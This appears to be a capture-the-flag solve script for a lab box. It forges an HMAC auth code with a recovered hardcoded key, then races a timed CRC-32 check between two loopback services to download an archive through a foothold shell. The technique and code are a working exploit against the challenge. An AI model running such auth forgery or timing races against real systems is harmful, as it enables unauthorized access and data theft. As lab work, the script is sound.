#!/usr/bin/env python3
"""
29-stillwater -- read the float gauge (9022) and race its value into the sump
control head (7742) to download the survey bundle (sump-survey.7z).

Auth to the gauge:
    window = floor(unix_time / 600)
    code   = HMAC-SHA256(gauge_key, decimal window)[:4] as hex
After AUTH, LEVEL returns the current water level. The sump service wants the
CRC-32 of that printed integer, and the level changes every 5 seconds -- so the
LEVEL read and the DRAW must happen inside the same 5-second quantum.

The gauge key is recovered from the flooded office disk (gauge.key).

Usage: ./draw_sump.py <TARGET_IP>
(9022/7742 are loopback-bound on the box; reach them from the foothold shell or
 a local tunnel. If tunneling, point `host` at the forwarded address.)
"""
import socket, time, hmac, hashlib, re, zlib, sys

host = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
key = bytes.fromhex(
    "d12a01c4849533d7aadab566187084478ebb26c0b8dcec65ea750eec87ee9b8e"
)

# start early in a quantum -- the gauge greeting sleeps ~1s
while time.time() % 5 > 2.5:
    time.sleep(0.05)

window = int(time.time()) // 600
auth = hmac.new(key, str(window).encode(), hashlib.sha256).digest()[:4].hex()

g = socket.create_connection((host, 9022))
g.settimeout(10)
print(g.recv(4096).decode(), end='')
g.sendall(f'AUTH {auth}\n'.encode())
print(g.recv(4096).decode(), end='')
g.sendall(b'LEVEL\n')
reply = g.recv(4096)
print(reply.decode(), end='')
level = re.search(rb'LEVEL (-?\d+) mm', reply).group(1)
check = zlib.crc32(level) & 0xffffffff
print('level', level.decode(), 'check', f'{check:08x}', 'phase', time.time() % 5)

s = socket.create_connection((host, 7742))
s.settimeout(10)
print(s.recv(4096).decode(), end='')
s.sendall(f'DRAW {check:08x}\n'.encode())
data = b''
while b'\nEND\n' not in data:
    part = s.recv(65536)
    if not part:
        break
    data += part
print(data.decode())
# strip the PAYLOAD/END protocol lines, then: base64 -d payload.b64 > sump-survey.7z
